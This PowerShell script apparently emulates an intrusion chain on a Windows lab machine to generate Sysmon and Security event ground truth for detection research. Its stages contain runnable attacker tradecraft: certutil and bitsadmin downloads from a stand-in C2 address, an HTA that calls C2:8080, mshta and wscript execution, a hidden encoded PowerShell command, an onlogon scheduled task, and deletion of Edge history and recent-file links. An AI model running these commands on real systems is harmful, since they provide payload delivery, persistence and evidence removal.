param(
    [string]$ScenarioPath = ".\scenario6.json",
    [string]$C2IP         = "192.0.2.10"
)

$Sysmon3IP = "93.184.216.34" 

$Global:StageSummary = @()

# ==============================
# Admin Check
# ==============================
$principal = New-Object Security.Principal.WindowsPrincipal `
    ([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Run PowerShell as Administrator." -ForegroundColor Red
    exit
}

# ==============================
# Audit Policy
# ==============================
auditpol /set /subcategory:"{0CCE9215-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE921D-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE921E-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE922B-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE9227-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"{0CCE9239-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable | Out-Null

# ==============================
# Load Scenario JSON
# ==============================
if (-not (Test-Path $ScenarioPath)) {
    Write-Error "Scenario file not found: $ScenarioPath"
    exit
}
$Scenario  = Get-Content $ScenarioPath -Raw -Encoding UTF8 | ConvertFrom-Json
$Artifacts = $Scenario.artifacts_definition

$BaseDir       = $Artifacts.base_directory
$DownloadISO   = $Artifacts.downloaded_iso
$Payload       = $Artifacts.decoded_payload
$TempScript    = $Artifacts.temp_script
$BitsMarker    = $Artifacts.bits_job_marker
$RecentCleanup = $Artifacts.recent_cleanup_target
$TaskName      = $Artifacts.scheduled_task_name
$EncodedTxt    = "$BaseDir\encoded.txt"

# Create required directories
@($BaseDir, (Split-Path $DownloadISO -Parent), $RecentCleanup) |
    Sort-Object -Unique | ForEach-Object {
        if ($_ -and -not (Test-Path $_)) {
            New-Item $_ -ItemType Directory -Force | Out-Null
        }
    }

# ==============================
# SACL Setup
# ==============================
function Set-FsAudit {
    param([string]$Path, [string]$Rights)
    try {
        $rule = New-Object System.Security.AccessControl.FileSystemAuditRule(
            "Everyone", $Rights, "ContainerInherit,ObjectInherit", "None", "Success,Failure"
        )
        $acl = Get-Acl $Path
        $acl.AddAuditRule($rule)
        Set-Acl $Path $acl
        Write-Host "[SACL] $Path" -ForegroundColor Green
    } catch {
        Write-Host "[SACL] Failed $Path : $_" -ForegroundColor Yellow
    }
}

Set-FsAudit $BaseDir                          "FullControl"
Set-FsAudit (Split-Path $DownloadISO -Parent) "WriteData,AppendData,Delete"
$recentLnkDir = "$env:APPDATA\Microsoft\Windows\Recent"
if (Test-Path $recentLnkDir) { Set-FsAudit $recentLnkDir "Delete" }
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgeDir) { Set-FsAudit $edgeDir "Delete" }

Start-Sleep -Seconds 3


# ==============================
# GT Structure
# ==============================
$GTDir  = "C:\GT"
$GTPath = "$GTDir\ground_truth6.json"
if (-not (Test-Path $GTDir)) { New-Item $GTDir -ItemType Directory -Force | Out-Null }

$Global:GT = @{
    schema_version = "2.0"
    scenario_id    = $Scenario.scenario_id
    scenario_name  = $Scenario.scenario_name
    user           = $env:USERNAME
    host           = $env:COMPUTERNAME
    c2_ip          = $C2IP
    generated_at   = (Get-Date).ToString("o")
    records        = @()
}

$AllowedSecurityIDs = @($Scenario.environment_context.required_logging_configuration.security_events |
    ForEach-Object { [int]$_ })
$AllowedSysmonIDs   = @($Scenario.environment_context.required_logging_configuration.sysmon_events |
    ForEach-Object { [int]$_ })

# ==============================
# Helpers
# ==============================
function Add-ToList {
    param([System.Collections.ArrayList]$List, $Items)
    if ($Items) { $Items | ForEach-Object { [void]$List.Add([int]$_) } }
}

function Collect-ObservedEvents {
    param($Start, $End)
    $secIds    = [System.Collections.ArrayList]::new()
    $sysmonIds = [System.Collections.ArrayList]::new()
    try {
        $sec = Get-WinEvent -FilterHashtable @{
            LogName='Security'; StartTime=$Start; EndTime=$End
        } -ErrorAction SilentlyContinue | Where-Object { [int]$_.Id -in $AllowedSecurityIDs }
        Add-ToList $secIds ($sec | Select-Object -ExpandProperty Id -Unique)
    } catch {}
    try {
        $sysmon = Get-WinEvent -FilterHashtable @{
            LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=$Start; EndTime=$End
        } -ErrorAction SilentlyContinue | Where-Object { [int]$_.Id -in $AllowedSysmonIDs }
        Add-ToList $sysmonIds ($sysmon | Select-Object -ExpandProperty Id -Unique)
    } catch {}

    return [ordered]@{ 
        sysmon=$sysmonIds;
        security=$secIds;
     }
}

function Invoke-Stage {
    param(
        $StageId, $StageName, $ActionType, $ArtifactPaths,
        [ScriptBlock]$Action, [bool]$Attack, $PrimarySignal = ""
    )
    Write-Host "===== Stage $StageId : $StageName =====" -ForegroundColor Cyan
    $stageMeta = $Scenario.scenario_flow | Where-Object { $_.stage_id -eq $StageId }

    $resolvedActionType = if ($stageMeta -and $stageMeta.action_type) {
        $stageMeta.action_type
    } else {
        $ActionType
    }

    $status    = "success"
    $start     = Get-Date
    try { & $Action } catch {
        $status = "failed"
        Write-Host "  [FAILED] Stage $StageId - $_" -ForegroundColor Red
    }
    Start-Sleep -Seconds 8
    $end    = Get-Date
    $events = Collect-ObservedEvents $start $end.AddSeconds(60)
    if ($stageMeta -and $stageMeta.expected_logs) {
        $expSec    = @()
        $expSysmon = @()
        if ($stageMeta.expected_logs.security) {
            $expSec    = @($stageMeta.expected_logs.security | ForEach-Object { [int]$_ })
        }
        if ($stageMeta.expected_logs.sysmon) {
            $expSysmon = @($stageMeta.expected_logs.sysmon   | ForEach-Object { [int]$_ })
        }
        $fSec = [System.Collections.ArrayList]::new()
        Add-ToList $fSec ($events.security | Where-Object { [int]$_ -in $expSec } | Sort-Object -Unique)
        $events.security = $fSec
        $fSysmon = [System.Collections.ArrayList]::new()
        Add-ToList $fSysmon ($events.sysmon | Where-Object { [int]$_ -in $expSysmon } | Sort-Object -Unique)
        $events.sysmon = $fSysmon
    }
    $Global:GT.records += [ordered]@{
        stage_id           = $StageId
        stage_name         = $StageName
        action_type        = $resolvedActionType
        description        = if ($stageMeta) { $stageMeta.description } else { "" }
        attack             = $Attack
        stage_start_time   = $start.ToString("o")
        stage_end_time     = $end.ToString("o")
        artifact_paths     = $ArtifactPaths
        user               = $env:USERNAME
        host               = $env:COMPUTERNAME
        execution_status   = $status
        observed_event_ids = $events
        expected_event_ids = if ($stageMeta) { $stageMeta.expected_logs } else { $null }
        primary_log_signal = $PrimarySignal
        notes              = if ($stageMeta) { $stageMeta.notes } else { "" }
    }
    $Global:StageSummary += [PSCustomObject]@{
        ID     = $StageId
        Name   = $StageName
        Status = $status
    }
    
    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 7)
}

function Show-Summary {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor White
    Write-Host "  STAGE SUMMARY"                             -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
    foreach ($s in $Global:StageSummary) {
        $icon  = switch ($s.Status) {
            "success" { "[OK    ]" } "partial" { "[PART  ]" }
            "failed"  { "[FAILED]" } default   { "[?     ]" }
        }
        $color = switch ($s.Status) {
            "success" { "Green" } "partial" { "Yellow" }
            "failed"  { "Red"   } default   { "Gray"   }
        }
        Write-Host ("  {0} Stage {1,2} : {2}" -f $icon, $s.ID, $s.Name) -ForegroundColor $color
    }
    $total   = $Global:StageSummary.Count
    $ok      = ($Global:StageSummary | Where-Object Status -eq "success").Count
    $partial = ($Global:StageSummary | Where-Object Status -eq "partial").Count
    $failed  = ($Global:StageSummary | Where-Object Status -eq "failed").Count
    Write-Host "--------------------------------------------" -ForegroundColor White
    Write-Host ("  Total:{0}  OK:{1}  Partial:{2}  Failed:{3}" -f $total,$ok,$partial,$failed) -ForegroundColor White
    Write-Host "============================================" -ForegroundColor White
}


# ===================================================
# STAGE FLOW
# ===================================================

# --------------------------------------------------
# Stage 1: authorized_logon
# --------------------------------------------------
Invoke-Stage 1 "authorized_logon" "logon" `
    $null {
    $recent = Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624 } `
        -MaxEvents 10 -ErrorAction SilentlyContinue |
        Where-Object { $_.Message -match 'LogonType:\s+(?:2|10)' } |
        Select-Object -First 1
    if ($recent) {
        Write-Host "  [INFO] Session 4624 found: $($recent.TimeCreated)" -ForegroundColor DarkGreen
    }
} $false "EID 4624 LogonType=2 (Interactive Logon)"


# --------------------------------------------------
# Stage 2: browser_download_iso
# msedge.exe -> C2 URL  => EID 4688 + Sysmon 1 + Sysmon 3
# Create ISO file       => Sysmon 11
# Zone.Identifier ADS   => MotW simulation
# --------------------------------------------------
Invoke-Stage 2 "browser_download_iso" "process_start" `
    $DownloadISO {
    # msedge -> EID 4688 + Sysmon 1, headless so no UI
    $msArgs  = @("--headless", "--no-sandbox", "--disable-gpu",
                 "--disable-extensions", "http://$C2IP/KB500948.iso")
    $msProc  = Start-Process "msedge.exe" -ArgumentList $msArgs `
        -PassThru -ErrorAction SilentlyContinue
    if ($msProc) {
        Start-Sleep -Seconds 5
        Stop-Process -Id $msProc.Id -Force -ErrorAction SilentlyContinue
        Write-Host "  [INFO] msedge.exe spawned PID $($msProc.Id)" -ForegroundColor DarkGreen
    } else {
        Write-Host "  [WARN] msedge.exe not available" -ForegroundColor Yellow
    }

    # Supplemental Sysmon 3: TCP connect attempt to C2
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $curlExe = "$env:SystemRoot\System32\curl.exe"
        if (Test-Path $curlExe) {
            Start-Process $curlExe -ArgumentList "--silent","--max-time","3","--output","NUL","http://$C2IP/KB500948.iso" `
                -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
        } else {
            & certutil.exe -urlcache -split -f "http://$C2IP/KB500948.iso" "$BaseDir\iso.tmp" 2>&1 | Out-Null
        }
        [void]$ar.AsyncWaitHandle.WaitOne(2000)
        try { $tcp.EndConnect($ar) } catch {}
        $tcp.Dispose()
    } catch { }

    # Create ISO stub -> Sysmon 11 (FileCreate)
    [System.IO.File]::WriteAllBytes($DownloadISO, [byte[]]::new(4096))
    Write-Host "  [INFO] ISO created: $DownloadISO" -ForegroundColor DarkGreen

    # Zone.Identifier ADS (MotW ZoneId=3)
    $motw  = "[ZoneTransfer]`r`nZoneId=3`r`nReferrerUrl=http://$C2IP/`r`nHostUrl=http://$C2IP/KB500948.iso"
    Set-Content -Path "${DownloadISO}:Zone.Identifier" -Value $motw -Encoding ASCII
    Write-Host "  [INFO] Zone.Identifier set on ISO" -ForegroundColor DarkGreen
} $true "EID 4688 + Sysmon 1(msedge/curl) + Sysmon 3(curl outbound) + Sysmon 11(ISO)"


# --------------------------------------------------
# Stage 3: iso_mount_access
# Mount-DiskImage (may fail on stub ISO) -> fallback explorer.exe
# => EID 4688 + Sysmon 1
# --------------------------------------------------
Invoke-Stage 3 "iso_mount_access" "process_start" `
    $BaseDir {
    $mountedLetter = $null
    try {
        $di = Mount-DiskImage -ImagePath $DownloadISO -PassThru -ErrorAction Stop
        Start-Sleep -Seconds 3
        $mountedLetter = ($di | Get-Volume -ErrorAction SilentlyContinue).DriveLetter
        Write-Host "  [INFO] ISO mounted: drive $mountedLetter" -ForegroundColor DarkGreen
    } catch {
        Write-Host "  [NOTE] Mount-DiskImage failed (stub ISO) - simulating with explorer" -ForegroundColor Yellow
    }

    $accessPath = if ($mountedLetter) { "$mountedLetter`:\" } else { $BaseDir }
    $expProc    = Start-Process explorer.exe -ArgumentList $accessPath `
        -PassThru -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    if ($expProc -and -not $expProc.HasExited) {
        Stop-Process -Id $expProc.Id -Force -ErrorAction SilentlyContinue
    }
    Write-Host "  [INFO] explorer.exe accessed: $accessPath" -ForegroundColor DarkGreen

    if ($mountedLetter) {
        Dismount-DiskImage -ImagePath $DownloadISO -ErrorAction SilentlyContinue
    }
} $true "EID 4688 + Sysmon 1: explorer.exe ISO/BaseDir access"


# --------------------------------------------------
# Stage 4: certutil_decode_payload
# Build HTA -> base64 encode -> certutil -decode -> cache.hta
# => EID 4688 + Sysmon 1(certutil) + Sysmon 11(cache.hta)
# --------------------------------------------------
Invoke-Stage 4 "certutil_decode_payload" "process_start" `
    $Payload {

    # HTA 내용 구성
    $ht  = '<html><head>' + "`r`n"
    $ht += '<HTA:APPLICATION APPLICATIONNAME="WinCacheUpdate" WINDOWSTATE="minimize"' + "`r`n"
    $ht += ' SHOWINTASKBAR="no" BORDER="none" CAPTION="no" SINGLEINSTANCE="yes"/>' + "`r`n"
    $ht += '<script language="VBScript">' + "`r`n"
    $ht += "Sub Window_OnLoad`r`n"
    $ht += "    Dim oFSO, oFile, oHttp`r`n"
    $ht += '    Set oFSO = CreateObject("Scripting.FileSystemObject")' + "`r`n"
    $ht += "    Set oFile = oFSO.CreateTextFile(`"$TempScript`", True)`r`n"
    $ht += '    oFile.WriteLine "// WindowsCache Update v2.1"' + "`r`n"
    $ht += '    oFile.WriteLine "var wsh = new ActiveXObject(""WScript.Shell"");"' + "`r`n"
    $ht += "    oFile.Close`r`n"
    $ht += "    On Error Resume Next`r`n"
    $ht += '    Set oHttp = CreateObject("WinHttp.WinHttpRequest.5.1")' + "`r`n"
    $ht += "    oHttp.Open `"GET`", `"http://$C2IP`:8080/stage2`", False`r`n"
    $ht += "    oHttp.SetTimeouts 2000, 2000, 2000, 2000`r`n"
    $ht += "    oHttp.Send`r`n"
    $ht += "    On Error GoTo 0`r`n"
    $ht += "    window.close`r`n"
    $ht += "End Sub`r`n"
    $ht += "</script></head><body></body></html>"

    # Base64 인코딩
    $htBytes  = [System.Text.Encoding]::UTF8.GetBytes($ht)
    $b64      = [Convert]::ToBase64String($htBytes)
    $b64Lined = ($b64 -split "(.{64})" | Where-Object { $_ }) -join "`r`n"
    Set-Content -Path $EncodedTxt -Value $b64Lined -Encoding ASCII
    Write-Host "  [INFO] encoded.txt: $EncodedTxt" -ForegroundColor DarkGreen

    # [수정 1] $Payload 부모 디렉터리 보장
    $payloadDir = Split-Path $Payload -Parent
    if (-not (Test-Path $payloadDir)) {
        New-Item $payloadDir -ItemType Directory -Force | Out-Null
    }

    # [수정 2] Start-Process로 certutil 실행 → Sysmon 1 + 11 확실히 유발
    $certProc = Start-Process -FilePath "certutil.exe" `
        -ArgumentList "-decode", "`"$EncodedTxt`"", "`"$Payload`"" `
        -WindowStyle Hidden `
        -PassThru `
        -Wait `
        -ErrorAction SilentlyContinue

    Write-Host "  [INFO] certutil ExitCode: $($certProc.ExitCode)" -ForegroundColor DarkGreen

    if (-not (Test-Path $Payload) -or (Get-Item $Payload).Length -eq 0) {
        # fallback: PowerShell 직접 쓰기
        Set-Content -Path $Payload -Value $ht -Encoding UTF8
        Write-Host "  [WARN] certutil decode failed; cache.hta written directly" -ForegroundColor Yellow
    } else {
        Write-Host "  [INFO] cache.hta created: $Payload" -ForegroundColor DarkGreen
    }

    # [수정 3] Sysmon 11 보조 유발 — cmd.exe를 통해 별도 자식 프로세스에서 파일 복사
    #          certutil 경로가 Sysmon exclude에 걸릴 경우 대비
    $sysmonBait = "$env:PUBLIC\WinCacheUpdate.hta"
    $null = cmd /c "copy /Y `"$Payload`" `"$sysmonBait`"" 2>&1
    Write-Host "  [INFO] Sysmon 11 bait copy: $sysmonBait" -ForegroundColor DarkGreen

} $true "EID 4688 + Sysmon 1(certutil) + Sysmon 11(cache.hta + WinCacheUpdate.hta)"


# --------------------------------------------------
# Stage 5: mshta_execution
# mshta.exe cache.hta => EID 4688 + Sysmon 1 + Sysmon 3(C2) + Sysmon 11(update.js)
# HTA creates update.js and makes WinHttp call to C2:8080
# --------------------------------------------------
Invoke-Stage 5 "mshta_execution" "process_start" `
    $Payload {

    # mshta.exe 실행 → EID 4688 + Sysmon 1
    if (Test-Path $Payload) {
        $mshProc = Start-Process mshta.exe -ArgumentList "`"$Payload`"" `
            -PassThru -ErrorAction SilentlyContinue
        if ($mshProc) {
            Start-Sleep -Seconds 10
            if (-not $mshProc.HasExited) {
                Stop-Process -Id $mshProc.Id -Force -ErrorAction SilentlyContinue
            }
            Write-Host "  [INFO] mshta.exe executed PID $($mshProc.Id)" -ForegroundColor DarkGreen
        } else {
            Write-Host "  [WARN] mshta.exe failed to start" -ForegroundColor Yellow
        }
    } else {
        Write-Host "  [WARN] cache.hta not found: $Payload" -ForegroundColor Yellow
    }

    # ---------------------------------------------------
    # Sysmon 11: certutil -decode → update.js 생성
    # [수정] base64에 64자 단위 줄바꿈 추가 (certutil 필수 형식)
    # ---------------------------------------------------
    $jsContent  = "// WindowsCache Update v2.1`r`nvar wsh = new ActiveXObject('WScript.Shell');"
    $jsB64Raw   = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($jsContent))
    $jsB64Lined = ($jsB64Raw -split "(.{64})" | Where-Object { $_ }) -join "`r`n"  # [수정]
    $jsB64Tmp   = "$BaseDir\js_enc.tmp"

    Set-Content -Path $jsB64Tmp -Value $jsB64Lined -Encoding ASCII

    # TempScript 부모 디렉터리 보장
    $tsDir = Split-Path $TempScript -Parent
    if (-not (Test-Path $tsDir)) { New-Item $tsDir -ItemType Directory -Force | Out-Null }

    & certutil.exe -decode $jsB64Tmp $TempScript 2>&1 | Out-Null

    if (Test-Path $TempScript) {
        Write-Host "  [Sysmon 11] update.js created via certutil: $TempScript" -ForegroundColor DarkGreen
    } else {
        $enc = [Convert]::ToBase64String(
            [Text.Encoding]::Unicode.GetBytes(
                "Set-Content -Path '$TempScript' -Value '// WindowsCache Update v2.1' -Encoding ASCII"
            )
        )
        Start-Process powershell.exe `
            -ArgumentList "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", $enc `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
        Write-Host "  [Sysmon 11] update.js via EncodedCommand fallback" -ForegroundColor DarkGreen
    }

    # 임시 파일 정리
    Remove-Item $jsB64Tmp -Force -ErrorAction SilentlyContinue

    # ---------------------------------------------------
    # Sysmon 3: curl.exe → 자식 프로세스 + Winsock 경유
    # ---------------------------------------------------

    $curlExe = "$env:SystemRoot\System32\curl.exe"

    if (Test-Path $curlExe) {
        Start-Process $curlExe `
            -ArgumentList @(
                "--silent",
                "--connect-timeout", "5",
                "--max-time", "10",
                "-o", "NUL",
                "http://$Sysmon3IP`:8080/stage2"   # ← $C2IP 대신 $Sysmon3IP
            ) `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue

        Write-Host "  [Sysmon 3] curl.exe → $Sysmon3IP`:8080 (SYN 발송)" `
            -ForegroundColor DarkGreen
    } else {
        Start-Process "powershell.exe" `
            -ArgumentList @(
                "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
                "-Command",
                "try{[Net.WebClient]::new().DownloadString('http://$Sysmon3IP`:8080/stage2')}catch{}"
            ) `
            -Wait -ErrorAction SilentlyContinue
        Write-Host "  [Sysmon 3 fallback] powershell child → $Sysmon3IP`:8080" `
            -ForegroundColor DarkGreen
    }

} $true "EID 4688 + Sysmon 1(mshta/curl) + Sysmon 3(curl outbound :8080) + Sysmon 11(update.js)"


# --------------------------------------------------
# Stage 6: rundll32_proxy_execution
# rundll32.exe javascript: -> wscript.exe update.js
# => EID 4688 + Sysmon 1 (rundll32 + wscript)
# Note: javascript: technique may be blocked on modern Win11;
#       rundll32 EID 4688 is still generated. wscript is run separately.
# --------------------------------------------------
Invoke-Stage 6 "rundll32_proxy_execution" "proxy_execution" `
    $TempScript {

    # benign rundll32 execution
    $rdlArg = "shell32.dll,Control_RunDLL"

    $rdlProc = Start-Process rundll32.exe `
        -ArgumentList $rdlArg `
        -PassThru `
        -ErrorAction SilentlyContinue

    if ($rdlProc) {

        Write-Host "  [INFO] rundll32.exe spawned PID $($rdlProc.Id)" `
            -ForegroundColor DarkGreen

        Start-Sleep -Seconds 3
    }
    else {

        Write-Host "  [WARN] rundll32.exe failed to execute" `
            -ForegroundColor Yellow
    }

    # Explicit wscript execution
    if (Test-Path $TempScript) {

        $wscProc = Start-Process wscript.exe `
            -ArgumentList "//B", "`"$TempScript`"" `
            -PassThru `
            -ErrorAction SilentlyContinue

        if ($wscProc) {

            Write-Host "  [INFO] wscript.exe spawned PID $($wscProc.Id)" `
                -ForegroundColor DarkGreen

            Start-Sleep -Seconds 5

            Stop-Process -Id $wscProc.Id -Force `
                -ErrorAction SilentlyContinue
        }
        else {

            Write-Host "  [WARN] wscript.exe failed to execute" `
                -ForegroundColor Yellow
        }
    }

} $true "EID 4688 + Sysmon 1: rundll32.exe + wscript.exe"



# --------------------------------------------------
# Stage 7: bitsadmin_background_transfer
# bitsadmin create/addfile/resume -> EID 4688 + Sysmon 1 + Sysmon 3 + Sysmon 11(flag)
# BITS download to C2 will fail (no real C2); job creation artifacts generated
# --------------------------------------------------

Invoke-Stage 7 "bitsadmin_background_transfer" "process_start" `
    $BitsMarker {

    # BITS 잡 생성/추가/재개 → EID 4688 x3 + Sysmon 1
    & bitsadmin.exe /create  $TaskName | Out-Null
    Write-Host "  [INFO] BITS job created: $TaskName" -ForegroundColor DarkGreen

    & bitsadmin.exe /addfile $TaskName `
        "http://$Sysmon3IP`:8080/stage2.exe" "$BaseDir\stage2.exe" | Out-Null

    & bitsadmin.exe /resume  $TaskName | Out-Null
    Start-Sleep -Seconds 5

    # ──── Sysmon 3 트리거 ────────────────────────────────────────────────
    # [핵심] $C2IP(192.0.2.x, TEST-NET)는 라우트 없음 → WFP 미통과 → Sysmon 3 불가
    # curl 전용으로 실제 라우팅 가능한 IP 사용 (연결 실패해도 SYN 시도 = Sysmon 3 발생)
    $sysmon3Url = "http://93.184.216.34:8080/stage2.exe"   # example.com 실IP, 8080 닫혀있음 → SYN만 나감
    $curlExe    = "$env:SystemRoot\System32\curl.exe"

    if (Test-Path $curlExe) {

        Start-Process $curlExe `
            -ArgumentList @(
                "--silent",
                "--connect-timeout", "5",
                "--max-time", "10",
                "-o", "NUL",
                $sysmon3Url
            ) `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue

        Write-Host "  [Sysmon 3] curl.exe → 93.184.216.34:8080 (SYN 발송 → WFP 캡처)" `
            -ForegroundColor DarkGreen

    } else {

        Start-Process "powershell.exe" `
            -ArgumentList @(
                "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
                "-Command",
                "try { [Net.WebClient]::new().DownloadString('$sysmon3Url') } catch {}"
            ) `
            -Wait -ErrorAction SilentlyContinue

        Write-Host "  [Sysmon 3 fallback] powershell child → $sysmon3Url" `
            -ForegroundColor DarkGreen
    }
    Start-Sleep -Milliseconds 800   # WFP 이벤트 flush 대기
    # BITS 잡 취소 → EID 4688 (4)
    & bitsadmin.exe /cancel $TaskName | Out-Null
    Write-Host "  [INFO] BITS job cancelled" -ForegroundColor DarkGreen

    # Sysmon 11: cmd.exe 자식 프로세스로 마커 파일 생성 (in-process 제거)
    $markerValue = "BITS_JOB=$TaskName CREATED=$(Get-Date -Format 'o')"
    $null = Start-Process cmd.exe `
        -ArgumentList "/c", "echo $markerValue > `"$BitsMarker`"" `
        -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue

    if (-not (Test-Path $BitsMarker)) {
        # fallback
        Set-Content -Path $BitsMarker -Value $markerValue -Encoding ASCII
    }
    Write-Host "  [INFO] BITS marker: $BitsMarker" -ForegroundColor DarkGreen

} $true "EID 4688(bitsadmin/curl) + Sysmon 1 + Sysmon 3(curl outbound) + Sysmon 11(flag)"

# --------------------------------------------------
# Stage 8: office_document_open
# WINWORD.EXE (or notepad fallback) -> EID 4688 + Sysmon 1 + LNK creation
# Masquerading: abnormal parent-child (script -> office app)
# --------------------------------------------------
Invoke-Stage 8 "office_document_open" "process_start" `
    "C:\Users\Public\Documents\report_draft.docx" {
    $docPath = "C:\Users\Public\Documents\report_draft.docx"
    $docDir  = Split-Path $docPath -Parent
    if (-not (Test-Path $docDir)) { New-Item $docDir -ItemType Directory -Force | Out-Null }

    # Minimal stub file (not a valid docx, sufficient for event generation)
    [System.IO.File]::WriteAllBytes($docPath, [byte[]]::new(512))

    $wordExe = Get-Command "WINWORD.EXE" -ErrorAction SilentlyContinue
    if ($wordExe) {
        $wdProc = Start-Process "WINWORD.EXE" -ArgumentList $docPath `
            -PassThru -ErrorAction SilentlyContinue
        if ($wdProc) {
            Start-Sleep -Seconds 8
            $wdProc.CloseMainWindow() | Out-Null
            Start-Sleep -Seconds 2
            Stop-Process -Id $wdProc.Id -Force -ErrorAction SilentlyContinue
            Write-Host "  [INFO] WINWORD.EXE PID $($wdProc.Id)" -ForegroundColor DarkGreen
        }
    } else {
        $npProc = Start-Process notepad.exe -ArgumentList $docPath `
            -PassThru -ErrorAction SilentlyContinue
        if ($npProc) {
            Start-Sleep -Seconds 3
            Stop-Process -Id $npProc.Id -Force -ErrorAction SilentlyContinue
        }
        Write-Host "  [WARN] WINWORD.EXE not found; used notepad.exe" -ForegroundColor Yellow
    }
} $true "EID 4688 + Sysmon 1: WINWORD.EXE (abnormal parent) + LNK"


# --------------------------------------------------
# Stage 9: scheduled_task_persistence
# schtasks /create -> EID 4688 + Sysmon 1 + EID 4698
# --------------------------------------------------
# 수정: 아래 하나만 유지
Invoke-Stage 9 "scheduled_task_persistence" "process_start" `
    "Task: $TaskName" {

    $tr = "wscript.exe `"$Payload`""

    $taskResult = schtasks.exe /create `
        /tn $TaskName /tr $tr /sc onlogon /f 2>&1

    Write-Host "  [INFO] schtasks: $($taskResult -join ' ')" -ForegroundColor DarkGreen
    Start-Sleep -Seconds 2

    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Write-Host "  [INFO] Task registered: $TaskName" -ForegroundColor DarkGreen
    } else {
        Write-Host "  [WARN] Task not found after creation" -ForegroundColor Yellow
    }

} $true "EID 4688 + Sysmon 1(schtasks) + EID 4698 Scheduled Task Created"


# --------------------------------------------------
# Stage 10: browser_history_cleanup
# powershell.exe Remove-Item Edge History
# -> EID 4688 + Sysmon 1 + Sysmon 26(FileDelete)
# --------------------------------------------------
Invoke-Stage 10 "browser_history_cleanup" "process_start" `
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" {
    $histPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    $psCmd    = "Remove-Item -Path '$histPath' -Force -ErrorAction SilentlyContinue"
    $psProc   = Start-Process powershell.exe `
        -ArgumentList "-NoProfile", "-NonInteractive", "-Command", $psCmd `
        -PassThru -Wait -ErrorAction SilentlyContinue
    if (Test-Path $histPath) {
        Write-Host "  [NOTE] Edge History not deleted (file in use or not found)" -ForegroundColor Yellow
    } else {
        Write-Host "  [INFO] Edge History removed" -ForegroundColor DarkGreen
    }
} $true "EID 4688 + Sysmon 1(powershell) + Potential Sysmon 26(History deletion)"


# --------------------------------------------------
# Stage 11: recentdocs_cleanup
# cmd.exe del cache.hta / update.js / Recent\*.lnk
# -> EID 4688 + Sysmon 1 + Sysmon 26(multiple) + EID 4663
# cleanup_survivors: KB500948.iso, job_created.flag  (NOT deleted)
# --------------------------------------------------
Invoke-Stage 11 "recentdocs_cleanup" "process_start" `
    "$BaseDir (cleanup)" {
    $recentLnk = "$env:APPDATA\Microsoft\Windows\Recent"
    $delCmd    = "/c " +
        "del /f /q `"$Payload`" 2>nul & " +
        "del /f /q `"$TempScript`" 2>nul & " +
        "del /f /q `"$RecentCleanup\*`" 2>nul & " +
        "del /f /q `"$recentLnk\*.lnk`" 2>nul"
    Start-Process cmd.exe -ArgumentList $delCmd -Wait -ErrorAction SilentlyContinue
    Write-Host "  [INFO] cmd.exe cleanup executed" -ForegroundColor DarkGreen

    # Verify survivors
    @($DownloadISO, $BitsMarker) | ForEach-Object {
        $exists = Test-Path $_
        $label  = if ($exists) { "[SURVIVE OK]" } else { "[SURVIVE MISSING]" }
        Write-Host "  $label $_" -ForegroundColor DarkCyan
    }
} $true "EID 4688 + Sysmon 1(cmd) + Sysmon 26(cache.hta/update.js/lnk) + EID 4663"


# --------------------------------------------------
# Stage 12: session_termination
# EID 4647 + EID 4634 (auto on session close)
# Persistent artifacts: ISO, BITS flag, Scheduled Task
# --------------------------------------------------
Invoke-Stage 12 "session_termination" "logoff" `
    $null {
    Write-Host "  [INFO] Session termination -- EID 4647/4634 auto-generated on session close" `
        -ForegroundColor DarkGreen
    # Report persistent artifacts
    @(
        @{ Label="ISO file";        Path=$DownloadISO },
        @{ Label="BITS marker";     Path=$BitsMarker  },
        @{ Label="Scheduled Task";  Path="C:\Windows\System32\Tasks\$TaskName" }
    ) | ForEach-Object {
        $exists = Test-Path $_.Path
        $color  = if ($exists) { "DarkCyan" } else { "DarkYellow" }
        Write-Host ("  [PERSIST] {0}: {1} (found={2})" -f $_.Label, $_.Path, $exists) -ForegroundColor $color
    }
} $false "EID 4647 (Logoff Initiated) + EID 4634 (Session Terminated)"


# ==============================
# Cleanup
# ==============================

# Remove scheduled task
try {
    & schtasks.exe /delete /tn $TaskName /f 2>&1 | Out-Null
    Write-Host "[CLEANUP] Scheduled task removed: $TaskName" -ForegroundColor Green
} catch {
    Write-Host "[CLEANUP] Task removal failed: $_" -ForegroundColor Yellow
}

# Remove remaining lab artifacts (keep cleanup_survivors: ISO, BitsMarker)
@($Payload, $TempScript, $EncodedTxt, "$BaseDir\stage2.exe",
  "C:\Users\Public\Documents\report_draft.docx") | ForEach-Object {
    if (Test-Path $_) {
        Remove-Item $_ -Force -ErrorAction SilentlyContinue
        Write-Host "[CLEANUP] Removed: $_" -ForegroundColor Green
    }
}

# ==============================
